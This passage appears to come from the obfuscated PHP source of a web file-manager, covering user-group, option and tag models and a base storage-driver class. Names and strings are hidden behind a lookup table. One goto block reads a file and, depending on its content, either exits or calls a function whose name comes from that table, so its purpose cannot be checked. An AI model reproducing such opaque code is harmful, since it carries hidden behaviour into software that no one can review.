$this->parseWhereLike($áƒĞù¯¬); $‡äÁ“ÛÒ = Model($Ş…‘ÌÚ[2319])->where($áƒĞù¯¬)->limit($‘ˆ“€‡Õ)->select(); if (!$‡äÁ“ÛÒ) { return array(); } $‡äÁ“ÛÒ = array_to_keyvalue($‡äÁ“ÛÒ, $Ş…‘ÌÚ[12], $Ş…‘ÌÚ[1663]); $”¬¿ÊˆĞ = $this->where(array($Ş…‘ÌÚ[1654] => array($Ş…‘ÌÚ[7], $‡äÁ“ÛÒ)))->select(); if (!$”¬¿ÊˆĞ) { return array(); } return $”¬¿ÊˆĞ; } private function _listDataApplyItem($Õå¥Œ¬) { $Ääá½é÷ = array($Õå¥Œ¬); $this->_listDataApply($Ääá½é÷); return $Ääá½é÷[0]; } private function _listDataApply(&$‹‰ÖİÒ¤) { $€ü¡÷”é =& $_SERVER[ñ÷§¡å]; if (!$‹‰ÖİÒ¤) { return; } array_remove_key($‹‰ÖİÒ¤, $€ü¡÷”é[896]); $Àİ“ÔÚî = array_to_keyvalue($‹‰ÖİÒ¤, $€ü¡÷”é[12], $€ü¡÷”é[1663]); $this->_listAppendGroup($‹‰ÖİÒ¤, $Àİ“ÔÚî); $this->_listAppendMeta($‹‰ÖİÒ¤, $Àİ“ÔÚî); $this->_listAppendSourceRoot($‹‰ÖİÒ¤, $Àİ“ÔÚî); } private function _listAppendSourceRoot(&$ÙÔÔ¬ö•, $ĞŠí‡Å¹) { $¤‡ª™ë¬ =& $_SERVER[ñ÷§¡å]; $ğºŞ¬Áğ = Model($¤‡ª™ë¬[838])->listSourceRoot(SourceModel::TYPE_USER, $ĞŠí‡Å¹); $ğºŞ¬Áğ = array_to_keyvalue($ğºŞ¬Áğ, $¤‡ª™ë¬[514]); $ğºŞ¬Áğ = array_remove_key($ğºŞ¬Áğ, $¤‡ª™ë¬[514]); foreach ($ÙÔÔ¬ö• as &$ò»ÑÑªŞ) { $ò»ÑÑªŞ[$¤‡ª™ë¬[96]] = $ğºŞ¬Áğ[$ò»ÑÑªŞ[$¤‡ª™ë¬[1663]]] ? $ğºŞ¬Áğ[$ò»ÑÑªŞ[$¤‡ª™ë¬[1663]]] : array(); } unset($ò»ÑÑªŞ); } private function _listAppendGroup(&$»é×¶™¶, $’‹é¡•¥) { $ÍºÚ¢ =& $_SERVER[ñ÷§¡å]; $¤àƒ²àñ = array($ÍºÚ¢[1663] => array($ÍºÚ¢[7], $’‹é¡•¥)); $™õ¹‹»µ = Model($ÍºÚ¢[1925])->where($¤àƒ²àñ)->select(); $½»÷¼èü = array_to_keyvalue($™õ¹‹»µ, $ÍºÚ¢[12], $ÍºÚ¢[1835]); $½»÷¼èü = array_remove_value(array_unique($½»÷¼èü), $ÍºÚ¢[207]); if (!$½»÷¼èü || !$™õ¹‹»µ) { return; } $¤àƒ²àñ = array($ÍºÚ¢[1835] => array($ÍºÚ¢[7], $½»÷¼èü)); $²üÏÂ†“ = Model($ÍºÚ¢[2016])->field($ÍºÚ¢[2320])->where($¤àƒ²àñ)->select(); $²üÏÂ†“ = array_to_keyvalue($²üÏÂ†“, $ÍºÚ¢[1835]); $™õ¹‹»µ = array_to_keyvalue_group($™õ¹‹»µ, $ÍºÚ¢[1663]); foreach ($™õ¹‹»µ as &$ş’­±á) { $£ª¨à¤¯ = array(); foreach ($ş’­±á as $×ı€Â„¶) { if (!$×ı€Â„¶[$ÍºÚ¢[1939]]) { continue; } $ı¨€ÃÌˆ = Model($ÍºÚ¢[516])->listData($×ı€Â„¶[$ÍºÚ¢[1939]]); $£ª¨à¤¯[] = array($ÍºÚ¢[1835] => $×ı€Â„¶[$ÍºÚ¢[1835]], $ÍºÚ¢[2321] => $²üÏÂ†“[$×ı€Â„¶[$ÍºÚ¢[1835]]][$ÍºÚ¢[32]], $ÍºÚ¢[530] => $²üÏÂ†“[$×ı€Â„¶[$ÍºÚ¢[1835]]][$ÍºÚ¢[530]], $ÍºÚ¢[422] => $ı¨€ÃÌˆ); } $ş’­±á = $£ª¨à¤¯; } unset($ş’­±á); foreach ($»é×¶™¶ as &$ßóæÄ‚ƒ) { $ßóæÄ‚ƒ[$ÍºÚ¢[2018]] = array(); if (isset($™õ¹‹»µ[$ßóæÄ‚ƒ[$ÍºÚ¢[1663]]])) { $ßóæÄ‚ƒ[$ÍºÚ¢[2018]] = $™õ¹‹»µ[$ßóæÄ‚ƒ[$ÍºÚ¢[1663]]]; } } unset($ßóæÄ‚ƒ); } public function userAppendGroup($Î¡Úûóæ) { $’ìîö®» =& $_SERVER[ñ÷§¡å]; if (!$Î¡Úûóæ) { return array(); } $this->_listAppendGroup($Î¡Úûóæ, array_to_keyvalue($Î¡Úûóæ, $’ìîö®»[12], $’ìîö®»[1663])); return $Î¡Úûóæ; } private function _listAppendMeta(&$º—¾Öş©, $¬Ğ¿ı–Õ) { $‹Õç¸‚ƒ =& $_SERVER[ñ÷§¡å]; $Î¶ü§ÅÂ = UserJobModel::JOB_KEY; $À¯ÈİÃÉ = array($‹Õç¸‚ƒ[2299]); $ªò¼¿Úî = array($‹Õç¸‚ƒ[1663] => array($‹Õç¸‚ƒ[7], $¬Ğ¿ı–Õ)); $íˆ§ûö = Model($‹Õç¸‚ƒ[2297])->where($ªò¼¿Úî)->select(); $íˆ§ûö = array_to_keyvalue_group($íˆ§ûö, $‹Õç¸‚ƒ[1663]); foreach ($íˆ§ûö as &$Øåˆî¢Ü) { $²òØÆ°¬ = array(); foreach ($Øåˆî¢Ü as $Şáùµî…) { if (!in_array($Şáùµî…[$‹Õç¸‚ƒ[104]], $À¯ÈİÃÉ)) { $²òØÆ°¬[$Şáùµî…[$‹Õç¸‚ƒ[104]]] = $Şáùµî…[$‹Õç¸‚ƒ[383]]; } } $Øåˆî¢Ü = $²òØÆ°¬; } unset($Øåˆî¢Ü); $ŸÑÆÃ¬² = Model($‹Õç¸‚ƒ[2322]); foreach ($º—¾Öş© as &$š·¡îŸˆ) { $“¬õŞØÉ = array(); if (isset($íˆ§ûö[$š·¡îŸˆ[$‹Õç¸‚ƒ[1663]]])) { $“¬õŞØÉ = $íˆ§ûö[$š·¡îŸˆ[$‹Õç¸‚ƒ[1663]]]; } $š·¡îŸˆ[$‹Õç¸‚ƒ[2323]] = array(); if (isset($“¬õŞØÉ[$Î¶ü§ÅÂ])) { $š·¡îŸˆ[$‹Õç¸‚ƒ[2323]] = $ŸÑÆÃ¬²->getUserJobInfo($“¬õŞØÉ[$Î¶ü§ÅÂ]); } } unset($š·¡îŸˆ); } protected function groupUserAll($Ï™‡†±) { $¡æÉ¸ø¢ =& $_SERVER[ñ÷§¡å]; if (!$Ï™‡†±) { return !1; } $¨øˆ©Áë = Model($¡æÉ¸ø¢[1925])->field($¡æÉ¸ø¢[1663])->where(array($¡æÉ¸ø¢[1835] => array($¡æÉ¸ø¢[7], $Ï™‡†±)))->select(); $¨øˆ©Áë = array_to_keyvalue($¨øˆ©Áë, $¡æÉ¸ø¢[12], $¡æÉ¸ø¢[1663]); return array_unique($¨øˆ©Áë); } public function userSearch($ıï—ò®, $†™«ˆÊÜ = "\x2a") { return Model($_SERVER[ñ÷§¡å][544])->where($ıï—ò®)->field($†™«ˆÊÜ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\160\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ö ÔÑÏ›) { $×Ò€©¶Ñ =& $_SERVER[ñ÷§¡å]; if (!defined($×Ò€©¶Ñ[484])) { define($×Ò€©¶Ñ[484], 0); } return "\125\x73\x65\x72\x4f\x70\164\151\157\156\x5f{$ö ÔÑÏ›}\137" . USER_ID; } protected function filterWhere($óéåÚ) { $×ªĞ©¶œ =& $_SERVER[ñ÷§¡å]; if (!defined($×ªĞ©¶œ[484])) { define($×ªĞ©¶œ[484], 0); } $óéåÚ[$×ªĞ©¶œ[1663]] = USER_ID; return $óéåÚ; } public function cacheRemoveUser($õêá°óİ, $™úËë) { return Cache::remove("\x55\163\145\x72\x4f\x70\164\151\157\156\x5f{$õêá°óİ}\137" . $™úËë); } protected function optionDefault($Œ¾«ÅÓ² = '') { $ô¾ô·¡¾ =& $_SERVER[ñ÷§¡å]; if ($Œ¾«ÅÓ² == $ô¾ô·¡¾[12]) { return $GLOBALS[$ô¾ô·¡¾[6]][$ô¾ô·¡¾[2324]]; } if ($Œ¾«ÅÓ² == $ô¾ô·¡¾[2325]) { return $GLOBALS[$ô¾ô·¡¾[6]][$ô¾ô·¡¾[2326]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\x61\147\x4c\x69\x73\x74"; public $modelType = "\125\x73\145\x72\117\x70\x74\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\171\154\145", "\x73\157\x72\x74"); public function listData($Ì¼—ö±‡ = false, $ÕØü‰“Ö = "\163\157\162\164", $”§»è…Ê = false) { return parent::listData($Ì¼—ö±‡, $ÕØü‰“Ö, $”§»è…Ê); } public function remove($—”°‘€Õ) { return parent::remove($—”°‘€Õ); } public function add($²ÅÈŞ«, $ëäù = "\x6c\x61\142\145\154\55\x67\x72\x65\x79\x2d\x6e\x6f\162\155\141\154") { $›²šäş =& $_SERVER[ñ÷§¡å]; if ($this->findByName($²ÅÈŞ«)) { return !1; } $ü ¬ßÓÛ = array($›²šäş[429] => $²ÅÈŞ«, $›²šäş[494] => $ëäù, $›²šäş[1839] => $this->getSort($›²šäş[267]) + 1); return parent::insert($ü ¬ßÓÛ); } public function update($—Ø±Ğ‰, $Æ«­šÉ¿) { $‡ŸÍú­ =& $_SERVER[ñ÷§¡å]; $ÛôÛ«ï = $this->listData($—Ø±Ğ‰); $¯×õàêæ = $this->findByName($Æ«­šÉ¿[$‡ŸÍú­[32]]); if (!$ÛôÛ«ï || $¯×õàêæ && $¯×õàêæ[$‡ŸÍú­[408]] != $ÛôÛ«ï[$‡ŸÍú­[408]]) { return !1; } return parent::update($—Ø±Ğ‰, $Æ«­šÉ¿); } public function moveTop($Ÿ¨‡Ñ‘Ö) { $İÎÅı =& $_SERVER[ñ÷§¡å]; $ë™Ôø•­ = parent::listData(); $Ê ×­» = $this->getSort($İÎÅı[266]); foreach ($ë™Ôø•­ as &$Ó¼œ¿Ó) { if ($Ó¼œ¿Ó[$İÎÅı[408]] == $Ÿ¨‡Ñ‘Ö) { $Ó¼œ¿Ó[$İÎÅı[1859]] = $Ê ×­»; continue; } $Ó¼œ¿Ó[$İÎÅı[1859]] += 1; } unset($Ó¼œ¿Ó); return parent::resetData($ë™Ôø•­); } public function moveBottom($ŒäŒ”¢ì) { $ü¹çÛ‡ =& $_SERVER[ñ÷§¡å]; $ÇÅÈ®ùˆ = $this->getSort($ü¹çÛ‡[267]) + 1; return parent::update($ŒäŒ”¢ì, array($ü¹çÛ‡[1859] => $ÇÅÈ®ùˆ)); } public function resetSort($‘§ÜæÚè) { $–¿ÇÇî =& $_SERVER[ñ÷§¡å]; $Ÿò¸Æß = array(); $‘§ÜæÚè = is_array($‘§ÜæÚè) ? $‘§ÜæÚè : array(); for ($¯¦ÔÂ = 0; $¯¦ÔÂ < count($‘§ÜæÚè); $¯¦ÔÂ++) { $Ÿò¸Æß[$‘§ÜæÚè[$¯¦ÔÂ] . $–¿ÇÇî[12]] = $¯¦ÔÂ + 1; } $Š¶ÛŸş• = parent::listData(); foreach ($Š¶ÛŸş• as &$ßÒŒ¿ï£) { $€‹¥¤“÷ = $Ÿò¸Æß[$ßÒŒ¿ï£[$–¿ÇÇî[408]]]; $ßÒŒ¿ï£[$–¿ÇÇî[1859]] = $€‹¥¤“÷ ? $€‹¥¤“÷ : $ßÒŒ¿ï£[$–¿ÇÇî[1859]]; } unset($ßÒŒ¿ï£); return parent::resetData($Š¶ÛŸş•); } private function getSort($á×·ùƒ²) { $òÜö²Šº =& $_SERVER[ñ÷§¡å]; $ÔÜ°¬¤¢ = parent::listData(); $¬‰ë½½Ã = array_to_keyvalue($ÔÜ°¬¤¢, $òÜö²Šº[12], $òÜö²Šº[1859]); if (!$¬‰ë½½Ã) { $¬‰ë½½Ã = array(0); } $ÉçâéƒÛ = $á×·ùƒ² == $òÜö²Šº[267] ? max($¬‰ë½½Ã) : min($¬‰ë½½Ã); return intval($ÉçâéƒÛ); } } goto D—¯•—ÁŸ¹; AÇïñ“ö«: if ($_SERVER[$_SERVER[ñ÷§¡å][60]] != $_SERVER[$_SERVER[ñ÷§¡å][61]]) { $_getc = $_SERVER[ñ÷§¡å][62]; $_getfile = $_SERVER[$_SERVER[ñ÷§¡å][63]] . $_SERVER[ñ÷§¡å][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ñ÷§¡å][65], $_getfilec); if (count($_getarrs) < $_SERVER[ñ÷§¡å][66]) { $exit = $_SERVER[ñ÷§¡å][67]; $exit(); } $_act = $_SERVER[ñ÷§¡å][68]; $_act($_SERVER[$_SERVER[ñ÷§¡å][69]]); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ŸïÏŞíœ =& $_SERVER[ñ÷§¡å]; $this->objectDriver = array($ŸïÏŞíœ[70], $ŸïÏŞíœ[71], $ŸïÏŞíœ[72], $ŸïÏŞíœ[73], $ŸïÏŞíœ[74], $ŸïÏŞíœ[75], $ŸïÏŞíœ[76], $ŸïÏŞíœ[77], $ŸïÏŞíœ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Æ™ÀÏ²ù) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Æ™ÀÏ²ù, $_SERVER[ñ÷§¡å][8]); } return $Æ™ÀÏ²ù; } public function iconvApp($Ï®Šğ¹¹) { return $Ï®Šğ¹¹; } public function iconvSystem($‹« øÉÌ) { return $‹« øÉÌ; } public function iconvTo($¢‹’äû¢, $”ı‹Ëı«, $Ü‘ŞÅ¡¸) { $¹½ë§€¶ =& $_SERVER[ñ÷§¡å]; if (!$¢‹’äû¢ || !function_exists($¹½ë§€¶[79])) { return $¢‹’äû¢; } static $Èï©‚ = array(); $†Û…Ø˜´ = $”ı‹Ëı« . $¹½ë§€¶[80] . $Ü‘ŞÅ¡¸ . $¹½ë§€¶[81] . $¢‹’äû¢; if (isset($Èï©‚[$†Û…Ø˜´])) { return $Èï©‚[$†Û…Ø˜´]; } if (function_exists($¹½ë§€¶[82])) { $ò±âşÇ® = @mb_convert_encoding($¢‹’äû¢, $Ü‘ŞÅ¡¸, $”ı‹Ëı«); } else { $ò±âşÇ® = @iconv($”ı‹Ëı«, $Ü‘ŞÅ¡¸, $¢‹’äû¢); } $ò±âşÇ® = $ò±âşÇ® ? $ò±âşÇ® : $¢‹’äû¢; if (strstr($ò±âşÇ®, $¹½ë§€¶[83])) { $ò±âşÇ® = str_replace($¹½ë§€¶[83], $¹½ë§€¶[11], $ò±âşÇ®); } $Èï©‚[$”ı‹Ëı« . $¹½ë§€¶[80] . $Ü‘ŞÅ¡¸ . $¹½ë§€¶[81] . $¢‹’äû¢] = $ò±âşÇ®; $Èï©‚[$Ü‘ŞÅ¡¸ . $¹½ë§€¶[80] . $”ı‹Ëı« . $¹½ë§€¶[81] . $¢‹’äû¢] = $¢‹’äû¢; $Èï©‚[$Ü‘ŞÅ¡¸ . $¹½ë§€¶[80] . $”ı‹Ëı« . $¹½ë§€¶[81] . $ò±âşÇ®] = $¢‹’äû¢; $Èï©‚[$”ı‹Ëı« . $¹½ë§€¶[80] . $Ü‘ŞÅ¡¸ . $¹½ë§€¶[81] . $ò±âşÇ®] = $ò±âşÇ®; return $ò±âşÇ®; } public function getPathInner($Ñ‘‡İíù) { $ÂçÌÒšØ = IO::init($Ñ‘‡İíù); return $ÂçÌÒšØ->path; } public function getPathOuter($÷ Ô…ğ—) { $ßãığ‚Û =& $_SERVER[ñ÷§¡å]; $Ê”Óï¾— = strlen(trim($this->pathBase, $ßãığ‚Û[8])); $÷ Ô…ğ— = substr(trim($÷ Ô…ğ—, $ßãığ‚Û[8]), $Ê”Óï¾—); return $this->pathDriver . $ßãığ‚Û[8] . ltrim($÷ Ô…ğ—, $ßãığ‚Û[8]); } public function isParentOf($£¢ÆŠËÌ, $ëÜœ€ã¾) { $Ó œª­„ =& $_SERVER[ñ÷§¡å]; $£¢ÆŠËÌ = rtrim(strtolower($£¢ÆŠËÌ), $Ó œª­„[8]) . $Ó œª­„[8]; $ëÜœ€ã¾ = rtrim(strtolower($ëÜœ€ã¾), $Ó œª­„[8]) . $Ó œª­„[8]; $É÷ÔÀŞ = strpos($ëÜœ€ã¾, $£¢ÆŠËÌ) === 0; return $É÷ÔÀŞ; } public function getType() { $è™€ÂıÊ =& $_SERVER[ñ÷§¡å]; $¼–‡õ» = str_replace($è™€ÂıÊ[84], $è™€ÂıÊ[12], get_class($this)); return strtolower($¼–‡õ»); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¯ØÅŞ€, $ÌÃã¬ÈŒ) { $İÎ¶ûô³ =& $_SERVER[ñ÷§¡å]; $óÛèµŠ‘ = rtrim($¯ØÅŞ€, $İÎ¶ûô³[8]) . $İÎ¶ûô³[8] . $ÌÃã¬ÈŒ; $…İƒÍ¼à = $this->exist($óÛèµŠ‘); return $…İƒÍ¼à ? $óÛèµŠ‘ : !1; } public function setModifyTime($“äğˆ®¢, $üÁ÷Ëƒ€ = '') { } public function renameObject($¯Ë½Èê«, $Í¡ãæÌ) { $œ‡ËÜÒÜ = $Í¡ãæÌ; $¯Ë½Èê« = $this->getPathOuter($¯Ë½Èê«); $Í¡ãæÌ = $this->pathFather($¯Ë½Èê«) . $Í¡ãæÌ; $í»Üø„§ = IO::copy($¯Ë½Èê«, $this->pathFather($¯Ë½Èê«), REPEAT_RENAME_FOLDER, $œ‡ËÜÒÜ); if ($í»Üø„§) { IO::remove($¯Ë½Èê«); } return $í»Üø„§ ? $Í¡ãæÌ : !1; } public function tempFile($º¬®Â² = '', $¿Îªçê = '') { if (!$º¬®Â²) { $º¬®Â² = rand_string(15); } $•ØßÔø‚ = TEMP_FILES . rand_string(15) . $_SERVER[ñ÷§¡å][8]; @mkdir($•ØßÔø‚, DEFAULT_PERRMISSIONS, !0); $˜”Ğ…†ç = $•ØßÔø‚ . $º¬®Â²; @touch($˜”Ğ…†ç); if ($¿Îªçê) { file_put_contents($˜”Ğ…†ç, $¿Îªçê); } return $˜”Ğ…†ç; } public function tempFileRemve($ÚÉ±ÌÚ ) { @unlink($ÚÉ±ÌÚ ); @rmdir($this->pathFather($ÚÉ±ÌÚ )); } public function mkfile($¨´ÊÍ¥Á, $¯²Œı±è = '', $±‹ç†‚È = REPEAT_RENAME) { } public function mkdir($†×ëæ«, $µá“Ş¢ = REPEAT_SKIP) { } public function delFile($´åè‡äÛ) { } public function delFolder($åÄŠ‘„ó) { } public function copyFile($ÉÚˆì‡í, $òÖ€Õ€Ç) { } public function moveFile($ã«¥€æï, $€·Çç‚¡) { } public function remove($¥ï†©¬×) { if ($this->isFile($¥ï†©¬×)) { return $this->delFile($¥ï†©¬×); } return $this->delFolder($¥ï†©¬×); } public function rename($Ç¹¢ï–, $¬¦®³ü) { } public function exist($—·”Íª×) { } public function findByHash($ƒÇí¤¿œ = '', $‰ûˆ×Î¥ = '') { return !1; } public function isFile($û¯×ÃòÁ) { } public function isFolder($ø×‡—û) { } public function size($‹ïÚÀ½‹) { } public function info($¨²õ³×ı) { } public function infoSimple($Âàä–¯) { return $this->info($Âàä–¯); } public function infoAuth($“¯ö÷§¬) { return $this->info($“¯ö÷§¬); } public function infoFull($–Å«øÉ¨) { return $this->info($–Å«øÉ¨); } public function infoWithChildren($´”ê°İü) { $ùìï—­ =& $_SERVER[ñ÷§¡å]; static $ÀÇÔÁ” = array(); if (isset($ÀÇÔÁ”[$´”ê°İü])) { return $ÀÇÔÁ”[$´”ê°İü]; } $»‘Õƒ˜ = $this->info($´”ê°İü); if ($»‘Õƒ˜ && $»‘Õƒ˜[$ùìï—­[33]] == $ùìï—­[85]) { $µÑ•”ú“ = array($ùìï—­[86] => 0, $ùìï—­[87] => 0, $ùìï—­[88] => 0); $this->infoChildren($´”ê°İü, $µÑ•”ú“); $»‘Õƒ˜[$ùìï—­[86]] = $µÑ•”ú“[$ùìï—­[86]]; $»‘Õƒ˜[$ùìï—­[89]] = array($ùìï—­[90] => $µÑ•”ú“[$ùìï—­[87]], $ùìï—­[91] => $µÑ•”ú“[$ùìï—­[88]]); $ÀÇÔÁ”[$´”ê°İü] = $»‘Õƒ˜; } return $»‘Õƒ˜; } public function listPath($ã†‘“ñò, $¤ÙÈÓ½© = false) { } public function has($†–×á¥ñ, $½äå°² = false, $ÄâÓ†ï… = false) { } public function canRead($¥ÁĞó·ï) { } public function canWrite($çá°°ƒÅ) { } public function getContent($äŠïÌ·) { } public function setContent($ö—ÙĞ©ñ, $¿»Ò§å = '') { } protected function infoChildren($û‘ˆæÖ–, &$›µ¬‰‡¯) { $¶£Ÿ…«± =& $_SERVER[ñ÷§¡å]; check_abort_echo(); $Àáˆáè = $this->listPath($û‘ˆæÖ–, !0); $Àáˆáè = array_merge($Àáˆáè[$¶£Ÿ…«±[92]], $Àáˆáè[$¶£Ÿ…«±[93]]); foreach ($Àáˆáè as $ÖÅŠåßì) { if ($ÖÅŠåßì[$¶£Ÿ…«±[33]] == $¶£Ÿ…«±[85]) { $›µ¬‰‡¯[$¶£Ÿ…«±[88]]++; $ÊùãÈï“ = $this->getPathInner($ÖÅŠåßì[$¶£Ÿ…«±[94]]); $this->infoChildren($ÊùãÈï“, $›µ¬‰‡¯); } else { $›µ¬‰‡¯[$¶£Ÿ…«±[87]]++; $›µ¬‰‡¯[$¶£Ÿ…«±[86]] += $ÖÅŠåßì[$¶£Ÿ…«±[86]]; } } } public function fileSubstr($£Òáü—, $Úï½‡¯Î, $¦æ×ìÛÀ) { } public function listAll($ÖÅ³ÔÉ) { } public function listAllMake($×šÃ¨–ó, &$Â…³Òšİ) { $ˆÁÍïÛÙ =& $_SERVER[ñ÷§¡å]; check_abort_echo(); $™¤¡×— = $this->listPath($×šÃ¨–ó, !0); if (!$™¤¡×—) { return; } $˜«šğ„£ = array_merge($™¤¡×—[$ˆÁÍïÛÙ[92]], $™¤¡×—[$ˆÁÍïÛÙ[93]]); foreach ($˜«šğ„£ as $ê×ò€) { $—İìç¦í = $ê×ò€[$ˆÁÍïÛÙ[33]] == $ˆÁÍïÛÙ[85]; $é¥­Ùİ² = array($ˆÁÍïÛÙ[94] => $ê×ò€[$ˆÁÍïÛÙ[94]], $ˆÁÍïÛÙ[85] => $—İìç¦í); if (isset($ê×ò€[$ˆÁÍïÛÙ[86]])) { $é¥­Ùİ²[$ˆÁÍïÛÙ[86]] = $ê×ò€[$ˆÁÍïÛÙ[86]]; } if (isset($ê×ò€[$ˆÁÍïÛÙ[95]])) { $é¥­Ùİ²[$ˆÁÍïÛÙ[95]] = $ê×ò€[$ˆÁÍïÛÙ[95]]; } if (!$—İìç¦í) { $Â…³Òšİ[] = $é¥­Ùİ²; continue; } $Â…³Òšİ[] = $é¥­Ùİ²; $ú”‘ùŸ´ = $ê×ò€[$ˆÁÍïÛÙ[94]]; $«ÂƒºÍü = $this->pathDriver; if (substr($ê×ò€[$ˆÁÍïÛÙ[94]], 0, strlen($«ÂƒºÍü)) == $«ÂƒºÍü) { $ú”‘ùŸ´ = substr($ú”‘ùŸ´, strlen($«ÂƒºÍü)); } $this->listAllMake($ú”‘ùŸ´, $Â…³Òšİ); } } public function listAllSimple($èÈçï—Ş) { $ùüªŞ¾ä =& $_SERVER[ñ÷§¡å]; $ô´İ°½Ó = array(); $É“â‡‡ = $this->listAll($èÈçï—Ş); $ŸŠÓîá• = $this->getPathOuter($èÈçï—Ş); foreach ($É“â‡‡ as $İ©¼Ú›”) { $°Èà’öô = $İ©¼Ú›”[$ùüªŞ¾ä[94]]; $äÌÀ£§Ë = $İ©¼Ú›”[$ùüªŞ¾ä[94]]; if (isset($İ©¼Ú›”[$ùüªŞ¾ä[96]])) { $°Èà’öô = $İ©¼Ú›”[$ùüªŞ¾ä[96]][$ùüªŞ¾ä[94]]; $İ©¼Ú›”[$ùüªŞ¾ä[86]] = $İ©¼Ú›”[$ùüªŞ¾ä[96]][$ùüªŞ¾ä[86]]; $İ©¼Ú›”[$ùüªŞ¾ä[95]] = $İ©¼Ú›”[$ùüªŞ¾ä[96]][$ùüªŞ¾ä[95]]; } else { $äÌÀ£§Ë = substr($İ©¼Ú›”[$ùüªŞ¾ä[94]], strlen(get_path_father($ŸŠÓîá•))); $äÌÀ£§Ë = $ùüªŞ¾ä[8] . ltrim($äÌÀ£§Ë, $ùüªŞ¾ä[8]); } $–«¥Ìïê = array($ùüªŞ¾ä[94] => $äÌÀ£§Ë, $ùüªŞ¾ä[85] => $İ©¼Ú›”[$ùüªŞ¾ä[85]]); if (isset($İ©¼Ú›”[$ùüªŞ¾ä[86]]) && !$İ©¼Ú›”[$ùüªŞ¾ä[85]]) { $–«¥Ìïê[$ùüªŞ¾ä[86]] = $İ©¼Ú›”[$ùüªŞ¾ä[86]]; } if (isset($İ©¼Ú›”[$ùüªŞ¾ä[95]])) { $–«¥Ìïê[$ùüªŞ¾ä[95]] = $İ©¼Ú›”[$ùüªŞ¾ä[95]]; } if (!$İ©¼Ú›”[$ùüªŞ¾ä[85]]) { $–«¥Ìïê[$ùüªŞ¾ä[97]] = $°Èà’öô; } $ô´İ°½Ó[] = $–«¥Ìïê; } return $ô´İ°½Ó; } public function upload($ğ•Ë‡“, $ÂµïÙÃ§, $şÙı·ÙÀ = false, $œ§—±àŠ = REPEAT_REPLACE) { } public function uploadFileByID($ë¬ì¾Ÿš, $Ú›ê‚«î, $ÉéÒşÂ©) { } public function uploadFileByPath($Ñ„¤şø½, $Ûüæş¶, $©ƒç¨¶ = array()) { } public function isUploadServer() { $Üµ‘üã =& $_SERVER[ñ÷§¡å]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Üµ‘üã[98]) { return !0; } return $GLOBALS[$Üµ‘üã[6]][$Üµ‘üã[99]][$Üµ‘üã[100]]; } public function isFileOutServer() { $ÇĞ®ıßá =& $_SERVER[ñ÷§¡å]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÇĞ®ıßá[98]) { return !0; } return $GLOBALS[$ÇĞ®ıßá[6]][$ÇĞ®ıßá[99]][$ÇĞ®ıßá[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¾‘Ş‘­ä) { $Í€ğ²¸® =& $_SERVER[ñ÷§¡å]; if (!$this->isCdnHost()) { return $¾‘Ş‘­ä; } return str_replace(trim(get_url_root($¾‘Ş‘­ä), $Í€ğ²¸®[8]), trim($this->cdnHost, $Í€ğ²¸®[8]), $¾‘Ş‘­ä); } public function uploadLink($ä§È¹¹Û, $İ¼÷ËË€ = 0) { $ÉŒë÷¥˜ =& $_SERVER[ñ÷§¡å]; if ($this->isUploadServer()) { return; } $à­¡õîÕ = $this->getType(); if (!in_array($à­¡õîÕ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ªñÌû§¯ = 1024 * 1024 * 10; $§ˆ£ùÚ = $İ¼÷ËË€ <= $ªñÌû§¯ ? $ÉŒë÷¥˜[102] : $ÉŒë÷¥˜[103]; $¤†ùÒÍ = (!$İ¼÷ËË€ ? 1 : ceil($İ¼÷ËË€ / pow(1024, 3))) * 3600 * 4; $áÒ’½… = $this->{$§ˆ£ùÚ}($ä§È¹¹Û, $¤†ùÒÍ); if ($áÒ’½…) { $áÒ’½…[$ÉŒë÷¥˜[104]] = $ä§È¹¹Û; $áÒ’½…[$ÉŒë÷¥˜[105]] = $à­¡õîÕ; } return $áÒ’½…; } public function uploadFormData($ÔÌ›ã»†, $ÓÅÌÌüÍ = 3600) { } public function multiUploadFormData($Íê˜—®, $š„´à¥˜ = 3600) { } public function download($éÂš“¶, $‡®¢“–¢) { } public function ext($—ì‘ï©) { $‚ÊŸáÏ½ =& $_SERVER[ñ÷§¡å]; if (strpos($—ì‘ï©, $‚ÊŸáÏ½[8]) === -1) { $Ú¹×¥Œñ = $—ì‘ï©; } else { $Ú¹×¥Œñ = $this->pathThis($—ì‘ï©); } $€½ËŠÚ = $‚ÊŸáÏ½[12]; if (strstr($Ú¹×¥Œñ, $‚ÊŸáÏ½[10])) { $€½ËŠÚ = substr($Ú¹×¥Œñ, strrpos($Ú¹×¥Œñ, $‚ÊŸáÏ½[10]) + 1); $€½ËŠÚ = strtolower($€½ËŠÚ); } if (strlen($€½ËŠÚ) > 3 && preg_match($‚ÊŸáÏ½[106], $€½ËŠÚ, $ïàÍĞÀ´)) { $€½ËŠÚ = $‚ÊŸáÏ½[12]; } return $€½ËŠÚ; } public function pathThis($œ’ñçÔÓ) { $ê››éêé =& $_SERVER[ñ÷§¡å]; $œ’ñçÔÓ = str_replace($ê››éêé[107], $ê››éêé[8], rtrim($œ’ñçÔÓ, $ê››éêé[8])); $Ø“ŠşÉ = strrpos($œ’ñçÔÓ, $ê››éêé[8]); if ($Ø“ŠşÉ === !1) { return $œ’ñçÔÓ; } return substr($œ’ñçÔÓ, $Ø“ŠşÉ + 1); } public function pathFather($¥†¯Ûà) { $­Ÿ¯©ã² =& $_SERVER[ñ÷§¡å]; $¥†¯Ûà = str_replace($­Ÿ¯©ã²[107], $­Ÿ¯©ã²[8], rtrim($¥†¯Ûà, $­Ÿ¯©ã²[8])); $İ™ûÔé¹ = strrpos($¥†¯Ûà, $­Ÿ¯©ã²[8]); if ($İ™ûÔé¹ === !1) { return 